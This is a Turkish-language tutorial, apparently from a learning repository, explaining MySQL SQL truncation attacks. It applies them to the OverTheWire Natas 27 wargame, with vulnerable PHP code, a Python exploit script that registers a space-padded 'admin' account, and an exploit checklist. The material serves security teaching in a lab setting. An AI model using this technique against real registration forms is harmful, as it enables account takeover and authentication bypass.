# 🌐 Web Güvenliği — SQL Truncation Attack

> MySQL bir VARCHAR alanına sığmayan veriyi kesmeden önce boşlukları da siler.
> Bu davranışı kullanarak farklı bir kullanıcı gibi kayıt olunabilir.

---

## 📋 İçindekiler

- [SQL Truncation Nedir?](#sql-truncation-nedir)
- [MySQL VARCHAR Davranışı](#mysql-varchar-davranışı)
- [Trailing Space + Truncation](#trailing-space--truncation)
- [Authentication Bypass Senaryosu](#authentication-bypass-senaryosu)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## SQL Truncation Nedir?

MySQL'de bir VARCHAR(n) alanına n karakterden uzun bir string INSERT edildiğinde, MySQL veriyi n karaktere **keser (truncate)**. Üstelik MySQL, trailing (sondaki) boşlukları keserken de bazı özel davranışlar sergiler.

```sql
CREATE TABLE users (
    username VARCHAR(16),
    password VARCHAR(16)
);

INSERT INTO users VALUES ('admin               x', 'şifre');
-- username 16 karaktere kesilir: "admin           " (16 karakter)
-- Sonra MySQL trailing space'leri de kaldırır → "admin"
```

---

## MySQL VARCHAR Davranışı

```sql
-- VARCHAR(10) alanına 15 karakter insert et
INSERT INTO test VALUES ('12345678901234X');
-- Kaydedilen: '1234567890' (10 karakter, X ve sonrası kesildi)

-- Trailing space durumu
INSERT INTO test VALUES ('admin     X');
-- VARCHAR(10): 'admin     ' (10 karakter, X kesildi)
-- MySQL trailing space'leri karşılaştırmada ignore eder
-- SELECT * WHERE username='admin' → bu kaydı bulur!
```

### UNIQUE Constraint ile Etkileşim

```sql
CREATE TABLE users (
    username VARCHAR(16) UNIQUE,
    password VARCHAR(16)
);

-- "admin" zaten kayıtlı
INSERT INTO users VALUES ('admin', 'sifre1');   -- OK
INSERT INTO users VALUES ('admin', 'sifre2');   -- ERROR: Duplicate entry
INSERT INTO users VALUES ('admin          x', 'sifre3');
-- Truncate sonrası: 'admin          ' → 'admin' ile aynı!
-- Ama bazı MySQL konfigürasyonlarında bu UNIQUE ihlali olmayabilir
-- ve kayıt oluşturulabilir
```

---

## Trailing Space + Truncation

### Saldırı Fikri

1. `admin` kullanıcısı sistemde kayıtlı, şifresini bilmiyoruz
2. `admin` ile kayıt olmaya çalışsak `UNIQUE` kısıtı engeller
3. Ama `"admin" + boşluklar + "x"` gönderirsek:
   - MySQL truncate eder → `"admin          "` (16 karakter)
   - Trailing space'ler anlamsız → `"admin"` gibi davranır
   - Yeni kayıt oluşturulur — **kendi seçtiğimiz şifre ile**
4. Giriş yaparken username `admin`, şifre bizim belirlediğimiz
5. MySQL `WHERE username='admin'` sorgusunda her iki kaydı da bulabilir
   — ilk bulunan bizim kayıt → giriş başarılı!

---

## Authentication Bypass Senaryosu

```sql
-- Mevcut durum:
-- users tablosu, username VARCHAR(64)
-- admin kayıtlı, şifresi bilinmiyor

-- Saldırı:
INSERT INTO users (username, password)
VALUES ('admin                                                              x', 'bizim_şifre');
--       ↑ 64+ karakter: "admin" + 59 boşluk + "x"
-- MySQL truncate eder → "admin" + 58 boşluk (64 karakter)
-- Trailing space → "admin" gibi saklanır

-- Giriş:
SELECT * FROM users WHERE username='admin' AND password='bizim_şifre'
-- Bu sorgu bizim kaydımızı bulur!
```

---

## Natas'ta Kullanım

### Natas 27 — Truncation ile Admin Erişimi

**Kaynak kod (özet):**

```php
<?php
// username VARCHAR(64)

function checkCredentials($link, $usr, $pass) {
    $user = mysql_real_escape_string($usr);
    $pass = mysql_real_escape_string($pass);
    $pass = md5($pass);

    $query = "SELECT username from users where username='$user' and password='$pass'";
    $res   = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0) return true;
    return false;
}

function createUser($link, $usr, $pass) {
    // Kullanıcı yoksa oluştur
    if(!doesUserExist($link, $usr)) {
        $user = mysql_real_escape_string($usr);
        $pass = mysql_real_escape_string($pass);
        $pass = md5($pass);
        $query = "INSERT INTO `users` (`username`, `password`) VALUES ('$user','$pass')";
        mysql_query($query, $link);
    }
}

function doesUserExist($link, $usr) {
    $user  = mysql_real_escape_string($usr);
    $query = "SELECT * FROM users WHERE username='$user'";
    $res   = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0) return true;
    return false;
}
```

**Sorun:**

`doesUserExist()` → `WHERE username='admin                 x'` → bu değer mevcut `admin` kaydıyla **eşleşmez**, çünkü **SELECT'in WHERE koşulundaki string literali TRUNCATE EDİLMEZ** (truncation yalnızca INSERT'te olur) → sondaki `x` durduğu için `doesUserExist` **false** döner → `createUser` **çağrılır**.

Kilit nokta truncation'ın *nerede* olduğu: SELECT'te değil, sadece `createUser`'ın **INSERT**'ünde. Değer `'admin'+boşluklar+'x'` VARCHAR(64)'e yazılırken 64. karakterden sonrası (yani `x`) kırpılır.

Sonuç: tabloda **ikinci bir `admin` kaydı** oluşur — şifresi *bizim* belirlediğimiz. Ardından `checkCredentials('admin', bizim_şifre)` bu yeni kayıtla eşleşir → admin girişi. (MySQL strict-mode kapalıyken fazla uzun VARCHAR değeri hata yerine sessizce kırpılır.)

**Exploit:**

```python
import requests

url      = "http://natas27.natas.labs.overthewire.org/"
username = "natas27"
password = "[natas27_şifresi]"

# "admin" + 59 boşluk + "x" = 65 karakter (VARCHAR(64) sınırını AŞAR → "x" kırpılır, geriye "admin"+boşluklar kalır)
evil_user = "admin" + " " * 59 + "x"
evil_pass = "merhaba"

# Adım 1: Sahte admin hesabı oluştur
r = requests.post(
    url,
    data={"username": evil_user, "password": evil_pass},
    auth=(username, password)
)
print("[*] Kayıt isteği gönderildi")

# Adım 2: Truncate edilmiş admin ile giriş yap
r = requests.post(
    url,
    data={"username": "admin", "password": evil_pass},
    auth=(username, password)
)
if "natas28" in r.text or "Password" in r.text:
    print("[✓] Admin girişi başarılı!")
    print(r.text)
```

---

### Truncation — Kontrol Listesi

```
Tespit:
  ☐ Kayıt formu var mı?
  ☐ Tablo schema'sında VARCHAR uzunluğu nedir?
  ☐ Strict mode kapalı mı? (MySQL eski sürüm)
  ☐ doesUserExist → truncate'ten önce mi sonra mı kontrol ediyor?

Exploit:
  ☐ [hedef_kullanıcı] + [boşluklar] + [rastgele karakter]
  ☐ Toplam uzunluk VARCHAR sınırını geçmeli
  ☐ Kendi şifrenle kayıt ol
  ☐ Temiz kullanıcı adıyla giriş yap
```

---

## 🔗 Kaynaklar

- [SQL Truncation Attack — Basis](https://resources.infosecinstitute.com/topic/sql-truncation-attack/)
- [MySQL — String Truncation](https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sqlmode_strict_all_tables)
- [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

**Önceki konu:** [18_php_object_injection.md](./18_php_object_injection.md)
**Sonraki konu:** [20_ecb_mode_zafiyeti.md](./20_ecb_mode_zafiyeti.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
